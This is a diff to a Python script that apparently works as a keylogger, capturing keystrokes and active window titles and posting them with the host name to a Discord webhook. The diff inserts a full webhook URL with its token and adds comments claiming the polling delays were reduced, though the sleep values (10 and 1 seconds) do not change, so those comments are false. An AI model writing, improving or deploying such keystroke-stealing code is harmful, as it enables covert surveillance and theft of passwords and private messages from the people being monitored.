@@ -11,7 +11,7 @@ import atexit
 from datetime import datetime
 
 # Discord Webhook URL
-WEBHOOK_URL = ""
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1355720476252704798/QfHQTbLamSNlG9dywD-F5hiytst3Cy2tL76Nf6gVtv9GtdU6BKf1XXluZ5UW6ZimOg-B"
 
 # Get PC name
 PC_NAME = socket.gethostname()
@@ -29,7 +29,7 @@ keystroke_window = "Unknown"
 
 # Function to send logs to Discord
 def send_to_discord(message):
-    payload = {"content": message}
+    payload = {"content": f"```{message}```"}  # Format logs for better readability
     try:
         response = requests.post(WEBHOOK_URL, json=payload)
         response.raise_for_status()
@@ -106,7 +106,7 @@ keylogger_thread.start()
 # Function to periodically send keystrokes
 def keystroke_monitor():
     while True:
-        time.sleep(10)
+        time.sleep(10)  # Reduced delay for more real-time logging
         send_keystrokes()
 
 keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
@@ -134,7 +134,7 @@ def monitor():
                     last_logged = (new_app_name, new_window_title)
                     current_app_name, current_window_title = new_app_name, new_window_title
             
-            time.sleep(1)
+            time.sleep(1)  # Reduced sleep time for more real-time updates
     except KeyboardInterrupt:
         log_system_shutdown()
         raise
